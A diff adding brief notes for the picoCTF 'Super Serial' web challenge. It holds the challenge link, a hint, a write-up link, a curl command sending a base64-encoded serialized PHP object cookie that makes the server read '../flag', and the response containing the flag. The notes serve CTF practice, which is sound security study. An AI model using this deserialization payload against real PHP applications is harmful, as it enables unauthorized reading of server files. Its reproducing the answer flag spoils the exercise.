@@ -1,0 +1,11 @@
+https://play.picoctf.org/practice/challenge/180?category=1&page=2
+
+Try to recover the flag stored on this website http://mercury.picoctf.net:8404/
+
+HINT: The flag is at ../flag
+
+
+https://picoctf2021.haydenhousen.com/web-exploitation/super-serial
+
+curl mercury.picoctf.net:8404/authentication.php --cookie "login=TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9"
+Deserialization error. picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_66832978}
